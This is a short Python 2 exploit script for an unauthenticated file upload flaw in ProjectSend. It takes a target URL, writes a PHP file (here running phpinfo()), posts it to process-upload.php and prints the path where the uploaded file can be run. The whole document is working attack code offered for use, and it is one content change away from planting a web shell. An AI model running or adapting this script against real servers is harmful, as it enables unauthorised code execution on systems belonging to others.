#!/usr/bin/env python
import requests
print"+---------------------------------------+"
print"| ProjectSend File Upload Vulnerability |"
print"+---------------------------------------+"

vuln = raw_input('Vulnerable Site:')
fname = raw_input('EvilFile:')
with open(fname, 'w') as fout:
    fout.write("<?php phpinfo() ?>")
url = vuln +'/process-upload.php' +'?name=' + fname
files = {'file': open(fname, 'rb')}
result = requests.post(url, files=files)
print "===>" +vuln+"/upload/files/"+fname
